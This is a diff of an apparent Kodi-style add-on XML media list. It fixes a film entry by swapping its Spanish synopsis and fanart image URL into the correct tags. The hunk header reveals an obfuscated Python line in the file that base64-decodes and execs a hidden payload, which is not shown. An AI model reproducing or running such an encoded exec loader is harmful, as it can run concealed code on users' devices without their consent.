@@ -93,9 +93,9 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 ]]></expres>
 <page></page>
 </regex>
-<info>https://www.themoviedb.org/t/p/original/hkj4U6azwlC6GO9j7Md1XUDVEBA.jpg</info>
+<info>Unos jóvenes asisten a una fiesta exclusiva en una isla remota. Pero el tentador paraíso con el que se encuentran oculta secretos y trampas muy peligrosos.</info>
 <thumbnail>https://www.themoviedb.org/t/p/original/iZSmq8iOupIIirR7rsvLqp5Ghi2.jpg</thumbnail>
-<fanart>Unos jóvenes asisten a una fiesta exclusiva en una isla remota. Pero el tentador paraíso con el que se encuentran oculta secretos y trampas muy peligrosos.</fanart>
+<fanart>https://www.themoviedb.org/t/p/original/hkj4U6azwlC6GO9j7Md1XUDVEBA.jpg</fanart>
 </item>
 
 
